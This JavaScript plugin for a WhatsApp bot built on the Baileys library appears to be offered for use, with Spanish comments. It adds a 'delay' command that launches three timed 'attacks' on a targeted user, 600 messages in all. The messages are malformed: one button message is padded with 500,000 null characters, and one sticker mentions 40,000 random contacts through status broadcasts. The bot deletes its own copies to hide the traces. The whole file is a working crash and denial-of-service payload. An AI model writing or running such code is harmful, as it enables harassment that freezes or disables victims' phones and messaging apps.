import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  // 🚀 Ataque 1
  conn.sendMessage(m.chat, { text: '🚀 Ataque 1 iniciado (0:00). Duración: 5 minutos.' }, { quoted: m });
  for (let round = 0; round < 10; round++) {
    setTimeout(() => {
      enviarTanda(conn, jid, round + 1, m, '1');
    }, round * 30000);
  }

  // ⏳ Ataque 2 (a los 10 min)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 2 iniciado (10:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '2');
      }, round * 30000);
    }
  }, 600000); // 10 min

  // ⏳ Ataque 3 (a los 20 min)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 3 iniciado (20:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '3');
      }, round * 30000);
    }

    // 🎯 Mensaje final
    setTimeout(() => {
      conn.sendMessage(m.chat, {
        text: '🎯 Ataque finalizado. 600 mensajes enviados en total.',
      }, { quoted: m });
    }, 300000); // 5 minutos después del inicio del ataque 3

  }, 1200000); // 20 minutos
};

handler.command = /^delay$/i;
export default handler;

// 📤 Enviar una tanda de 20 mensajes
async function enviarTanda(conn, jid, num, m, ciclo) {
  try {
    for (let i = 0; i < 20; i++) {
      const m1 = await InVisibleX(conn, jid, true);
      const m2 = await xatanicaldelayv2(conn, jid, true);

      await conn.sendMessage(conn.user.id, { delete: m1.key });
      await conn.sendMessage(conn.user.id, { delete: m2.key });

      await delay(1000);
    }

    await conn.sendMessage(m.chat, {
      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
    }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: "❌ Error en tanda:\n" + e.message,
    }, { quoted: m });
  }
}

// 💤 Delay simple
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 💣 InVisibleX
async function InVisibleX(sock, jid, mention) {
  const msg = await generateWAMessageFromContent(jid, {
    buttonsMessage: {
      text: "🩸",
      contentText: "@raysofhopee",
      footerText: "vip",
      buttons: [
        {
          buttonId: ".aboutb",
          buttonText: {
            displayText: "HADES VIP!" + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: { protocolMessage: { key: msg.key, type: 25 } },
      },
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "hmmm" },
          content: undefined,
        },
      ],
    });
  }

  return msg;
}

// 💣 xatanicaldelayv2
async function xatanicaldelayv2(sock, jid, mention) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
          },
        ],
      },
    ],
  });

  return msg;
}